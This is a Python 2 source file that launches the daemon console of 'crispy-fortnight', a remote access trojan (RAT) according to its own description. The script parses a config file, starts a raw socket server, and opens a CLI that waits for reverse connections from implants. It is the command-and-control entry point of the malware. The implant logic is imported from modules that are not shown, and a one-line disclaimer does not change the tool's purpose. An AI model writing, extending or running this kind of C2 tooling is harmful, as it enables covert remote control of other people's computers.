import argparse
import logging
import ConfigParser
import threading

from crispy.lib.cli import CrispyCLI
from crispy.network.server import RawSocketServer
from crispy import __version__

def main():
    argp = argparse.ArgumentParser(description="crispy-fortnight (Python RAT) daemon console. All implants will do a reverse connection back to this server.",
                                   epilog="***Do NOT use this for nefarious purposes!***", 
                                   prog="crispyd")
    argp.add_argument("--config",
                        dest="config_file",
                        help="path to crispy.conf file",
                        metavar="<config_file>",
                        required=True, 
                        type=str)
    argp.add_argument("--loglvl",
			choices=["DEBUG", "INFO", "WARNING", "ERROR"],
			default="WARNING",
			dest="loglevel",
			help="change log verbosity (default: %(default)s)",
			type=str)
    argp.add_argument("--version", action="version", version="%(prog)s {}".format(__version__))
    args = argp.parse_args()

    if args.loglevel == "DEBUG":
	loglevel = logging.DEBUG
    elif args.loglevel == "ERROR":
	loglevel = logging.ERROR
    elif args.loglevel == "INFO":
	loglevel = logging.INFO
    else:
	loglevel = logging.WARNING
    
    logging.basicConfig(datefmt="%m/%d/%Y %I:%M:%S %p",
			filename="crispy.log",
			format="%(asctime)-15s - %(levelname)-7s - %(module)-8s - %(message)s",
			level=loglevel)
    
    config = ConfigParser.ConfigParser()
    config.read(args.config_file)
    
    host = config.get("DAEMON", "host")
    port = config.getint("DAEMON", "port")

    try:
        tsrv = RawSocketServer(host, port)
        logging.info("Started server on {}:{}".format(host, port))
	logging.info("Listening for connections, press <Ctrl-C> to quit")
        tsrv.daemon = True
        tsrv.start()
        CrispyCLI(tsrv).cmdloop()
    except KeyboardInterrupt:
	logging.warning("Ctrl-C received... shutting down crispyd")
        tsrv.shutdown()

if __name__ == "__main__":
    main()
